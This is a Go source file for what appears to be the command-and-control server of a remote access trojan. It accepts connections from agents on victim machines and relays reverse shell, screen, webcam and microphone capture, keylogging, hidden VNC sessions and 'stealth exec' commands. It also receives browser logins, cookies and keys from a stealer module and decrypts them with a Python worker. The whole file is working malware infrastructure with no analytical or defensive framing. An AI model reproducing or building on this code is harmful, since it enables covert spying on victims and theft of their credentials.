package handlers

import (
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"github.com/gorilla/mux"
)

// --- Constants ---
const (
	MAGIC             = 0xBEEFCAFE
	TYPE_AUTH         = 1
	TYPE_SHELL_IN     = 10
	TYPE_SHELL_OUT    = 11
	TYPE_SCREEN_START = 20
	TYPE_SCREEN_STOP  = 21
	TYPE_SCREEN_FRAME = 22
	TYPE_SCREEN_CONFIG = 23
	TYPE_MONITOR_LIST = 24
	TYPE_AGENT_KILL      = 30
	TYPE_AGENT_UNINSTALL = 31
	TYPE_AGENT_RESTART   = 32
	TYPE_AGENT_UPDATE    = 33
	TYPE_INPUT_MOUSE     = 40
	TYPE_INPUT_KEY       = 41
	
	// Audio
	TYPE_AUDIO_MIC_START = 50
	TYPE_AUDIO_MIC_STOP  = 51
	TYPE_AUDIO_MIC_FRAME = 52
	TYPE_AUDIO_CONFIG    = 53
	TYPE_AUDIO_DEV_LIST  = 54
	TYPE_AUDIO_SYS_START = 55
	TYPE_AUDIO_SYS_STOP  = 56
	TYPE_AUDIO_SYS_FRAME = 57

	// Files
	TYPE_FILE_LS_REQ     = 60
	TYPE_FILE_LS_RES     = 61
	TYPE_FILE_DOWN_REQ   = 62
	TYPE_FILE_DOWN_RES   = 63
	TYPE_FILE_UP_REQ     = 64
	TYPE_FILE_DELETE     = 65
	TYPE_FILE_MKDIR      = 66
	
	// Cam
	TYPE_CAM_START       = 70
	TYPE_CAM_STOP        = 71
	TYPE_CAM_FRAME       = 72
	TYPE_CAM_CONFIG      = 73
	TYPE_CAM_LIST        = 74
	
	// Process
	TYPE_PROC_LS_REQ     = 80
	TYPE_PROC_LS_RES     = 81
	TYPE_PROC_KILL       = 82
	
	// Keylogger
	TYPE_KEYLOG_START    = 90
	TYPE_KEYLOG_STOP     = 91
	TYPE_KEYLOG_DATA     = 92

	// Commands
	TYPE_OPEN_URL        = 0x90
	
	// Chat
	TYPE_CHAT_INIT       = 0xA0
	TYPE_CHAT_MSG        = 0xA1
	TYPE_CHAT_EXIT       = 0xA2

	// System Info
	TYPE_SYS_INFO        = 0xB0
	TYPE_HEARTBEAT       = 0xB1

	// Stealth Exec
	TYPE_STEALTH_EXEC    = 0xC0

	// HVNC
	TYPE_HVNC_START      = 0xD0
	TYPE_HVNC_STOP       = 0xD1
	TYPE_HVNC_FRAME      = 0xD2
	TYPE_HVNC_INPUT      = 0xD3
	TYPE_HVNC_EXEC       = 0xD4

	// Stealer
	TYPE_STEALER_EXEC    = 0xE0
	TYPE_STEALER_RESULT  = 0xE1
	TYPE_STEALER_FINISH  = 0xE2
)

// --- Structs ---

type SystemSpecs struct {
	PCName    string `json:"pc_name"`
	OS        string `json:"os"`
	CPU       string `json:"cpu"`
	GPU       string `json:"gpu"`
	RAMTotal  string `json:"ram_total"`
	Country   string `json:"country"`
	HWID      string `json:"hwid"`
	Antivirus string `json:"antivirus"`
	Uptime    string `json:"uptime"`
}

type AgentStatus struct {
	ActiveWindow string `json:"active_window"`
	CPUUsage     int    `json:"cpu_usage"`
	RAMUsage     int    `json:"ram_usage"`
	LastSeen     int64  `json:"last_seen"`
	IsOnline     bool   `json:"is_online"`
	Ping         int    `json:"ping"`
}

type AgentContext struct {
	Conn       net.Conn
	Specs      SystemSpecs
	Status     AgentStatus
	CurrentIP  string
	HWID       string
	LogDir     string
	PingStart  time.Time
}

type AgentInfo struct {
	ID        string       `json:"id"`
	IP        string       `json:"ip"`
	Status    string       `json:"status"`
	Specs     SystemSpecs  `json:"specs"`
	Stats     AgentStatus  `json:"stats"`
}

// --- Globals ---
var Agents = make(map[string]*AgentContext)
var AgentsMutex = &sync.RWMutex{}
var StealerStatus = make(map[string]string) 
var StealerStatusMutex = &sync.Mutex{}

// --- Server ---

func StartTCPServer(addr string) {
	listener, err := net.Listen("tcp", addr)
	if err != nil {
		fmt.Printf("Failed to bind TCP: %v\n", err)
		return
	}
	defer listener.Close()
	fmt.Printf("[+] TCP Server Listening on %s\n", addr)

	go func() {
		for {
			time.Sleep(3 * time.Second)
			AgentsMutex.Lock()
			for _, ctx := range Agents {
				if ctx.Status.IsOnline && ctx.Conn != nil {
					ctx.PingStart = time.Now()
					buf := make([]byte, 12)
					binary.LittleEndian.PutUint32(buf[0:4], MAGIC)
					binary.LittleEndian.PutUint32(buf[4:8], TYPE_HEARTBEAT)
					binary.LittleEndian.PutUint32(buf[8:12], 0)
					ctx.Conn.Write(buf)
				}
			}
			AgentsMutex.Unlock()
		}
	}()

	for {
		conn, err := listener.Accept()
		if err != nil {
			continue
		}
		go handleAgent(conn)
	}
}

func handleAgent(conn net.Conn) {
	tempID := conn.RemoteAddr().String()
	header := make([]byte, 12)
	var myHWID string

	for {
		_, err := io.ReadFull(conn, header)
		if err != nil {
			break 
		}

		magic := binary.LittleEndian.Uint32(header[0:4])
		pktType := binary.LittleEndian.Uint32(header[4:8])
		length := binary.LittleEndian.Uint32(header[8:12])

		if magic != MAGIC {
			break
		}

		var body []byte
		if length > 0 {
			body = make([]byte, length)
			_, err = io.ReadFull(conn, body)
			if err != nil {
				break
			}
		}

		if pktType == TYPE_SYS_INFO {
			var newSpecs SystemSpecs
			if err := json.Unmarshal(body, &newSpecs); err == nil && newSpecs.HWID != "" {
				myHWID = newSpecs.HWID
				ip := strings.Split(tempID, ":")[0]

				AgentsMutex.Lock()
				ctx, exists := Agents[myHWID]
				if exists {
					if ctx.Conn != nil && ctx.Conn != conn {
						ctx.Conn.Close()
					}
					ctx.Conn = conn
					ctx.CurrentIP = ip
					ctx.Status.IsOnline = true
					ctx.Specs = newSpecs 
					ctx.Status.LastSeen = time.Now().Unix()
				} else {
					ctx = &AgentContext{
						Conn:      conn,
						Specs:     newSpecs,
						Status:    AgentStatus{ActiveWindow: "Idle", IsOnline: true, LastSeen: time.Now().Unix(), Ping: 0},
						CurrentIP: ip,
						HWID:      myHWID,
						LogDir:    fmt.Sprintf("../logs/%s", myHWID),
					}
					Agents[myHWID] = ctx
					notification := fmt.Sprintf("NEW_CLIENT|%s|%s", ctx.Specs.PCName, myHWID)
					BroadcastGlobal(notification)
				}
				AgentsMutex.Unlock()

				os.MkdirAll(fmt.Sprintf("../logs/%s", myHWID), 0755)
				BroadcastToUI(myHWID, "SYS_INFO:"+string(body))
				continue 
			}
		}

		if myHWID == "" {
			if pktType == TYPE_AUTH { continue }
			break
		}

		AgentsMutex.RLock()
		ctx := Agents[myHWID]
		AgentsMutex.RUnlock()
		ctx.Status.LastSeen = time.Now().Unix()

		switch pktType {
		case TYPE_HEARTBEAT:
			if !ctx.PingStart.IsZero() {
				rtt := time.Since(ctx.PingStart).Milliseconds()
				ctx.Status.Ping = int(rtt)
			}
		case TYPE_SYS_INFO:
			json.Unmarshal(body, &ctx.Specs)
			BroadcastToUI(myHWID, "SYS_INFO:"+string(body))
		case TYPE_SHELL_OUT:
			if strings.Contains(string(body), "[Stealer]") {
				fmt.Println(string(body))
			}
			BroadcastToUI(myHWID, string(body))
		case TYPE_MONITOR_LIST:
			BroadcastToUI(myHWID, "MONITORS:"+string(body))
		case TYPE_SCREEN_FRAME:
			BroadcastBinaryToUI(myHWID, append([]byte{0x01}, body...))
		case TYPE_AUDIO_MIC_FRAME:
			BroadcastBinaryToUI(myHWID, append([]byte{0x02}, body...))
		case TYPE_AUDIO_SYS_FRAME:
			BroadcastBinaryToUI(myHWID, append([]byte{0x02}, body...))
		case TYPE_AUDIO_CONFIG:
			BroadcastToUI(myHWID, "AUDIO_CONFIG:"+string(body))
		case TYPE_AUDIO_DEV_LIST:
			BroadcastToUI(myHWID, string(body))
		case TYPE_FILE_LS_RES:
			BroadcastToUI(myHWID, "FILES:"+string(body))
		case TYPE_FILE_DOWN_RES:
			BroadcastBinaryToUI(myHWID, body)
		case TYPE_CAM_LIST:
			BroadcastToUI(myHWID, "CAMS:"+string(body))
		case TYPE_CAM_FRAME:
			BroadcastBinaryToUI(myHWID, append([]byte{0x03}, body...))
		case TYPE_PROC_LS_RES:
			BroadcastToUI(myHWID, "PROCS:"+string(body))
		case TYPE_KEYLOG_DATA:
			logData := string(body)
			BroadcastToUI(myHWID, "KEYLOG:"+logData)
			AppendLogFile(myHWID, logData)
		case TYPE_CHAT_MSG:
			BroadcastToUI(myHWID, "CHAT:"+string(body))
		case TYPE_HVNC_FRAME:
			BroadcastBinaryToUI(myHWID, append([]byte{0x04}, body...))
		case TYPE_STEALER_RESULT:
			HandleStealerResult(myHWID, body)
		case TYPE_STEALER_FINISH:
			stealerRoot := fmt.Sprintf("../logs/%s/stealer", myHWID)
			os.MkdirAll(stealerRoot, 0755)
			DecryptStealer(stealerRoot)
			StealerStatusMutex.Lock()
			StealerStatus[myHWID] = "finished"
			StealerStatusMutex.Unlock()
			BroadcastToUI(myHWID, "STEALER_FINISH")
		}
	}

	conn.Close()
	if myHWID != "" {
		AgentsMutex.Lock()
		if ctx, ok := Agents[myHWID]; ok {
			if ctx.Conn == conn {
				fmt.Printf("[-] Agent OFFLINE: %s (%s)\n", ctx.Specs.PCName, myHWID)
				ctx.Status.IsOnline = false
				ctx.Status.Ping = 0
				ctx.Conn = nil 
			}
		}
		AgentsMutex.Unlock()
	}
}

// --- Helpers ---

func AppendLogFile(hwid, data string) {
	logDir := fmt.Sprintf("../logs/%s", hwid)
	os.MkdirAll(logDir, 0755)
	f, err := os.OpenFile(filepath.Join(logDir, "keylogs.txt"), os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil { return }
	defer f.Close()
	f.WriteString(data)
}

func GetAgents(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	AgentsMutex.RLock()
	defer AgentsMutex.RUnlock()
	list := make([]AgentInfo, 0, len(Agents))
	for hwid, ctx := range Agents {
		statusStr := "Offline"
		if ctx.Status.IsOnline { statusStr = "Online" }
		list = append(list, AgentInfo{ 
			ID:     hwid, 
			IP:     ctx.CurrentIP,
			Status: statusStr,
			Specs:  ctx.Specs,
			Stats:  ctx.Status,
		})
	}
	json.NewEncoder(w).Encode(list)
}

func DeleteAgent(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	hwid := vars["id"]
	AgentsMutex.Lock()
	defer AgentsMutex.Unlock()
	if _, ok := Agents[hwid]; ok {
		delete(Agents, hwid)
		w.WriteHeader(http.StatusOK)
	} else {
		http.Error(w, "Agent not found", http.StatusNotFound)
	}
}

func GetKeylogs(w http.ResponseWriter, r *http.Request) {
    vars := mux.Vars(r)
    hwid := vars["id"]
    logPath := fmt.Sprintf("../logs/%s/keylogs.txt", hwid)
    if _, err := os.Stat(logPath); os.IsNotExist(err) {
        http.Error(w, "No logs found", http.StatusNotFound)
        return
    }
    http.ServeFile(w, r, logPath)
}

func GetStealerFiles(w http.ResponseWriter, r *http.Request) {
    w.Header().Set("Access-Control-Allow-Origin", "*")
    w.Header().Set("Content-Type", "application/json")
    vars := mux.Vars(r)
    hwid := vars["id"]
    rootDir := fmt.Sprintf("../logs/%s/stealer", hwid)
    var files []string
    filepath.Walk(rootDir, func(path string, info os.FileInfo, err error) error {
        if err != nil || info.IsDir() { return nil }
        rel, _ := filepath.Rel(rootDir, path)
        files = append(files, strings.ReplaceAll(rel, "\\", "/"))
        return nil
    })
    json.NewEncoder(w).Encode(files)
}

func GetStealerStatus(w http.ResponseWriter, r *http.Request) {
    w.Header().Set("Access-Control-Allow-Origin", "*")
    w.Header().Set("Content-Type", "application/json")
    vars := mux.Vars(r)
    id := vars["id"]
    StealerStatusMutex.Lock()
    status, ok := StealerStatus[id]
    if !ok { status = "idle" }
    StealerStatusMutex.Unlock()
    json.NewEncoder(w).Encode(map[string]string{"status": status})
}

func SendControlPacket(agentID string, pktType uint32) {
	AgentsMutex.RLock()
	ctx, ok := Agents[agentID]
	AgentsMutex.RUnlock()
	if !ok || !ctx.Status.IsOnline || ctx.Conn == nil { return }
	buf := make([]byte, 12)
	binary.LittleEndian.PutUint32(buf[0:4], MAGIC)
	binary.LittleEndian.PutUint32(buf[4:8], pktType)
	binary.LittleEndian.PutUint32(buf[8:12], 0)
	ctx.Conn.Write(buf)
}

func SendCommandToAgentWithType(agentID string, cmd []byte, pktType uint32) {
	AgentsMutex.RLock()
	ctx, ok := Agents[agentID]
	AgentsMutex.RUnlock()
	if !ok || !ctx.Status.IsOnline || ctx.Conn == nil { return }
	buf := make([]byte, 12+len(cmd))
	binary.LittleEndian.PutUint32(buf[0:4], MAGIC)
	binary.LittleEndian.PutUint32(buf[4:8], pktType)
	binary.LittleEndian.PutUint32(buf[8:12], uint32(len(cmd)))
	copy(buf[12:], cmd)
	ctx.Conn.Write(buf)
}

func HandleStealerResult(hwid string, body []byte) {
	if len(body) < 4 { return }
	nameLen := binary.LittleEndian.Uint32(body[0:4])
	if uint32(len(body)) < 4+nameLen { return }
	taggedName := string(body[4 : 4+nameLen])
	content := body[4+nameLen:]
	category := "Misc"
	filename := taggedName
	if parts := strings.SplitN(taggedName, "::", 2); len(parts) == 2 {
		category = parts[0]
		filename = parts[1]
	}
	dir := fmt.Sprintf("../logs/%s/stealer/%s", hwid, category)
	os.MkdirAll(dir, 0755)
	path := filepath.Join(dir, filename)
	err := os.WriteFile(path, content, 0644)
	if err == nil {
		if category == "Browsers" && (strings.Contains(filename, "Login") || strings.Contains(filename, "Cookie") || strings.Contains(filename, "Key")) {
			go DecryptStealer(dir) 
		}
	}
}

func ClearStealerLogs(hwid string) {
    dir := fmt.Sprintf("../logs/%s/stealer", hwid)
    os.RemoveAll(dir)
    os.MkdirAll(dir, 0755)
    fmt.Printf("[*] Stealer logs cleared for %s\n", hwid)
}

func DecryptStealer(dir string) {
    tpl := filepath.Join("templates", "decrypt_worker.py")
    scriptBytes, err := os.ReadFile(tpl)
    if err != nil {
        tpl = filepath.Join("..", "server", "templates", "decrypt_worker.py")
        scriptBytes, err = os.ReadFile(tpl)
        if err != nil {
            fmt.Printf("[-] Failed to read decrypt_worker.py template: %v\n", err)
            return
        }
    }

    scriptPath := filepath.Join(dir, "decrypt_worker.py")
    if err := os.WriteFile(scriptPath, scriptBytes, 0644); err != nil {
        fmt.Printf("[-] Failed to write decrypt script: %v\n", err)
        return
    }

    cmd := exec.Command("python", "decrypt_worker.py")
    cmd.Dir = dir
    output, err := cmd.CombinedOutput()
    if err != nil { 
        fmt.Printf("[-] Decryption Script Error: %v\nOutput: %s\n", err, string(output))
    }
}
